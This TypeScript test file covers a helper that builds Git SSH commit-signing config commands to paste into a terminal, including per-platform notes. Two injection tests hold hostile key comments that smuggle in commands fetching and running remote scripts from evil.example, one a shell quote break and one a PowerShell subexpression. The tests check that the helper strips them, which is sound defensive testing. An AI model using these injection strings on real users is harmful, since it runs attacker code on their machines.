import assert from 'node:assert/strict';
import { test } from 'node:test';
import { gitSigningClipboardText, gitSigningConfig, shellSafeKey } from '../gitSigningConfig';

const LINE = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexampleAAAAC3NzaC1lZDI1 me@laptop';
/** The same key WITHOUT its comment — what may appear inside a shell command. */
const KEY_ONLY = 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexampleAAAAC3NzaC1lZDI1';

test('the four lines that make Git sign with an SSH key', () => {
  const config = gitSigningConfig(LINE, 'linux', '/run/creds/agent.sock');

  assert.deepEqual(config.commands, [
    'git config --global gpg.format ssh',
    `git config --global user.signingkey "key::${KEY_ONLY}"`,
    'git config --global commit.gpgsign true',
    'git config --global tag.gpgsign true',
  ]);
});

test('the key travels as key:: literal, so no file has to exist for Git to sign', () => {
  // The whole point: the private half lives in the agent, and the public half is inline.
  const config = gitSigningConfig(LINE, 'linux', '/run/creds/agent.sock');
  assert.ok(config.commands.some((c) => c.includes(`"key::${KEY_ONLY}"`)));
  assert.equal(config.commands.some((c) => c.includes('.ssh/')), false, 'no path to a key file');
});

test('Windows gets gpg.ssh.program pointed at the BUILT-IN ssh-keygen — measured, not guessed', () => {
  // Git for Windows ships an MSYS ssh-keygen that cannot talk to a named pipe (it answers
  // "Bad file descriptor"); the built-in OpenSSH one can. Without this line Git would fail to
  // reach the agent and report a signing error with nothing naming the cause.
  const config = gitSigningConfig(LINE, 'win32', '\\\\.\\pipe\\creds-for-devs-agent-1');

  assert.ok(
    config.commands.some((c) => c === 'git config --global gpg.ssh.program "C:/Windows/System32/OpenSSH/ssh-keygen.exe"'),
  );
  assert.match(config.note, /built-in OpenSSH client/);
  assert.match(config.note, /\$env:SSH_AUTH_SOCK/);
});

test('POSIX gets no gpg.ssh.program line and the shell export form', () => {
  const config = gitSigningConfig(LINE, 'darwin', '/run/creds/agent.sock');

  assert.equal(config.commands.some((c) => c.includes('gpg.ssh.program')), false);
  assert.match(config.note, /export SSH_AUTH_SOCK="\/run\/creds\/agent\.sock"/);
});

test('the note says the public key must be added as a SIGNING key, which forges keep separate', () => {
  const config = gitSigningConfig(LINE, 'linux', '/s');
  assert.match(config.note, /SIGNING key/);
});

test('the clipboard text is runnable commands then the note as comments', () => {
  const text = gitSigningClipboardText(gitSigningConfig(LINE, 'linux', '/s'));
  const lines = text.trimEnd().split('\n');

  assert.equal(lines[0], 'git config --global gpg.format ssh');
  const comments = lines.filter((l) => l.length > 0 && !l.startsWith('git config'));
  assert.ok(comments.length > 0);
  assert.ok(comments.every((l) => l.startsWith('# ')), `every note line is a comment: ${comments.join(' | ')}`);
});

// ---- the injection this feature would otherwise have carried ------------------

test('an entity name with shell metacharacters cannot reach the copied command', () => {
  // The chain the security review found: an entity name arrives from somebody else's CSV or
  // JSON export, becomes the SSH key comment, and this command is put on the clipboard for a
  // person to paste into a terminal. A name that closes the quote runs whatever follows.
  const hostile =
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample srv" ; curl -s https://evil.example/p.sh | sh #';
  const config = gitSigningConfig(hostile, 'linux', '/s');
  const line = config.commands.find((c) => c.includes('user.signingkey')) ?? '';

  assert.equal(line.includes('curl'), false, `the injected command survived: ${line}`);
  assert.equal(line.includes(';'), false);
  assert.equal(line.includes('|'), false);
  // What is left is exactly the two fields a public key has.
  assert.equal(line, 'git config --global user.signingkey "key::ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample"');
});

test('a PowerShell subexpression in a name does not survive either', () => {
  // Worse than breaking out of quotes: $(...) executes INSIDE a double-quoted PowerShell string.
  // A REAL key body, so this exercises stripping rather than the outright refusal above.
  const hostile = `${KEY_ONLY} $(iwr evil.example/p.ps1|iex)`;
  const line = gitSigningConfig(hostile, 'win32', 'a-pipe-name').commands.find((c) =>
    c.includes('user.signingkey'),
  );

  assert.equal(line, `git config --global user.signingkey "key::${KEY_ONLY}"`);
  assert.equal(line?.includes('$('), false, line);
  assert.equal(line?.includes('iex'), false, line);
});

test('shellSafeKey keeps a real key and refuses something that is not one', () => {
  assert.equal(
    shellSafeKey('ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample me@laptop'),
    'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIexample',
  );
  assert.equal(shellSafeKey('not a key at all'), undefined);
  assert.equal(shellSafeKey(''), undefined);
});

test('an unreadable key produces NO commands rather than a command that is not what it looks like', () => {
  const config = gitSigningConfig('garbage', 'linux', '/s');
  assert.deepEqual(config.commands, []);
  assert.match(config.note, /could not be read/);
});
